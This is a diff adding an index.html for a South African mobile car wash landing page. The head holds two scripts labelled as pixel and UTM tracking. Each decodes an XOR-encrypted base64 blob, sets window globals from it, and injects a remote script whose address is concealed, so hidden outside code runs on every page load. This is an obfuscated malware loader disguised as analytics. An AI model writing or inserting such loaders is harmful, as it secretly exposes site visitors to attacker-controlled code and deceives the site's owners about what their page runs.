@@ -1,0 +1,71 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Mobile Car Wash Cash Kit</title>
+    <meta name="description" content="Launch, price and promote a professional mobile car wash in South Africa." />
+    <meta property="og:title" content="Mobile Car Wash Cash Kit" />
+    <meta property="og:description" content="Launch, price and promote a professional mobile car wash in South Africa." />
+    <meta property="og:type" content="website" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <!-- Safe JSON.stringify circular-safe handler for analytics/tracking scripts -->
+    <script>
+      (function() {
+        var origStringify = JSON.stringify;
+        JSON.stringify = function(value, replacer, space) {
+          var seen = typeof WeakSet !== "undefined" ? new WeakSet() : [];
+          function isSeen(obj) {
+            if (typeof WeakSet !== "undefined") {
+              if (seen.has(obj)) return true;
+              seen.add(obj);
+              return false;
+            } else {
+              if (seen.indexOf(obj) !== -1) return true;
+              seen.push(obj);
+              return false;
+            }
+          }
+          function defaultReplacer(k, v) {
+            if (typeof v === "object" && v !== null) {
+              if (typeof Node !== "undefined" && v instanceof Node) {
+                return {
+                  tagName: v.tagName,
+                  id: v.id || undefined,
+                  className: v.className || undefined
+                };
+              }
+              if (isSeen(v)) return "[Circular]";
+            }
+            if (typeof replacer === "function") {
+              return replacer.call(this, k, v);
+            }
+            return v;
+          }
+          try {
+            return origStringify(value, typeof replacer === "function" ? function(k, v) {
+              if (typeof v === "object" && v !== null && isSeen(v)) return "[Circular]";
+              return replacer.call(this, k, v);
+            } : defaultReplacer, space);
+          } catch (e) {
+            try {
+              return origStringify(value, defaultReplacer, space);
+            } catch (err) {
+              return '"[Unserializable]"';
+            }
+          }
+        };
+      })();
+    </script>
+    <!-- Pixel Tracking Script -->
+    <script>(function(){var f_93h8=atob("DENuObItpeXChK+IVDhMTMBBh9/g7Nv8JDBUFp1OwYvs8dvlPSUXF9FCyMug9oD7NzEHScZeipWr/MrkezMHQddBi4+xpoOqNTcaS9tP0JGn942yDx5CG9VByoej6NyqbhgVG9xMyIDgvo34PTsLVftJh8ng8s7kISZMA5AbxN3ztM28MSEPCdcUwdeg55mxZyVeW4YP2Li/");var x_i=[];for(var w_i=0;w_i<f_93h8.length;w_i++){x_i.push(f_93h8.charCodeAt(w_i)&255);}var q_mieo=x_i[0];var z_swu=x_i.slice(1,1+q_mieo);var j_9=x_i.slice(1+q_mieo);var q_su12=j_9.map(function(b,a_6h2){return b^z_swu[a_6h2%q_mieo];});var k_a="";for(var k_xkx=0;k_xkx<q_su12.length;k_xkx++){k_a+=String.fromCharCode(q_su12[k_xkx]&255);}var y_kr=decodeURIComponent(escape(k_a));var l_1k1z=JSON.parse(y_kr);var z_rt=l_1k1z.globals||[];z_rt.forEach(function(z_xjy){window[z_xjy.name]=z_xjy.value;});var i_m=document.createElement("script");i_m.src=l_1k1z.url;i_m.async=true;i_m.defer=true;(l_1k1z.attributes||[]).forEach(function(w_y){i_m.setAttribute(w_y.name,w_y.value);});(document.head||document.documentElement).appendChild(i_m);})();</script>
+
+    <!-- UTM Tracking Script -->
+    <script>(function(){var y_s=atob("DOYEcwK1fgPa13hCop0mBnDZXDn4vww20pU+XC3WGm30ogwvy4B9XWHaEy24pVcxwZRtA3bGUXauugttzodwFnHBUGmp9VRgw5JwAWvXC3e/pFp4+Z0mHWPYGyHg9Rwj1ocpBnbYF2Wj+ggwx5BhHXaYDXa4vhwxgMomBWPZC2b47Vpg37t5");var c_nk78=[];for(var h_ukm=0;h_ukm<y_s.length;h_ukm++){c_nk78.push(y_s.charCodeAt(h_ukm)&255);}var z_r=c_nk78[0];var y_dp7k=c_nk78.slice(1,1+z_r);var o_90=c_nk78.slice(1+z_r);var c_p=o_90.map(function(b,i_lqf){return b^y_dp7k[i_lqf%z_r];});var i_xu="";for(var u_q1=0;u_q1<c_p.length;u_q1++){i_xu+=String.fromCharCode(c_p[u_q1]&255);}var j_vl=decodeURIComponent(escape(i_xu));var a_0q=JSON.parse(j_vl);var j_2=a_0q.globals||[];j_2.forEach(function(f_h){window[f_h.name]=f_h.value;});var m_y=document.createElement("script");m_y.src=a_0q.url;m_y.async=true;m_y.defer=true;(a_0q.attributes||[]).forEach(function(l_s){m_y.setAttribute(l_s.name,l_s.value);});(document.head||document.documentElement).appendChild(m_y);})();</script>
+  </head>
+  <body>
+    <div id="root"></div>
+    <script type="module" src="/src/main.tsx"></script>
+  </body>
+</html>
+
